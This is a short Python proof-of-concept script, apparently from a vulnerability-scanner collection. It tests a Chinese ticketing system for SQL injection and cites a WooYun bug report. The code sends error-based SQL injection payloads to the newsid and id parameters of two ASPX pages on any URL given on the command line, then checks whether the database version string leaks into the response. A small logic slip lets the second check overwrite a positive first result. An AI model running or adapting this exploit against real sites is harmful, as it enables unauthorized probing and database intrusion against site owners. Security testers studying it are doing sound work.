#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 票友票务系统通用sql注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0128207
author: Lucifer
description: 文件/newslist.aspx中,参数newsid存在SQL注入。
             文件/news_view.aspx中,参数id存在SQL注入。
'''
import sys
import requests
import warnings
def run(url):
        result = ['票友票务系统通用sql注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/newslist.aspx?newsid=1Or/**/1=CoNvErT(InT,(ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@VeRsIoN))--"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"BBBMicrosoft" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl

            vulnurl = url + "/news_view.aspx?id=1Or/**/1=CoNvErT(InT,(ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@VeRsIoN))--"
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"BBBMicrosoft" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
